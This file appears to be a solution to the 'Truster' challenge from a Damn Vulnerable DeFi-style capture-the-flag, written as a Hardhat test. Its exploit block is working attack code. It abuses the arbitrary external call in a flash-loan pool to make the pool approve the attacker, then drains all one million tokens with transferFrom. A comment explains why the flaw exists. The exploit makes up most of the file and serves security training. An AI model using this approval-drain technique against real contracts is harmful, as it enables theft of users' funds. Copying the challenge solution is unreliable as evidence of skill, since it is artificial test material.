import { ethers } from "hardhat";
import { expect } from "chai";




describe('[Challenge] Truster', function () {
    this.timeout(0);
    
    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000'); 

    before(async function () {
        /** SETUP SCENARIO */
        
        const accounts = await ethers.getSigners();
        const [deployer, attacker, ...otherAccounts] = accounts;

        const tokenFactory = await ethers.getContractFactory("DamnValuableToken");
        this.token = await tokenFactory.connect(deployer).deploy();

        const poolFactory = await ethers.getContractFactory("TrusterLenderPool");
        this.pool = await poolFactory.connect(deployer).deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.eq(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.eq(0);
    });

    it('Exploit', async function () {
        /** YOUR EXPLOIT GOES HERE */
        const accounts = await ethers.getSigners();
        const attacker = accounts[1];
 
        /*
         * We can call any function with params since flashLoan function directly use
         * "call" with "calldata data" parameter. We cannot transfer any money since 
         * it checks the balance at the end of the function however we can use 
         * approve function (thanks to ERC20) and transfer the approved amount later.
         */

        const poolInterface = new ethers.utils.Interface([
            "function approve(address spender, uint256 amount)"
        ]);

        const targetBalance = TOKENS_IN_POOL;

        const callData = poolInterface.encodeFunctionData(
            "approve", [attacker.address, targetBalance]
        );
        
        let tx = await this.pool.flashLoan(0, attacker.address, this.token.address, callData);
        await tx.wait();
        console.log(tx);

        tx = await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, targetBalance);
        await tx.wait();
        console.log(tx);
   });

    after(async function () {
        const accounts = await ethers.getSigners();
        const attacker = accounts[1];

        /** SUCCESS CONDITION */
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.eq(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.eq(0);
    });
});
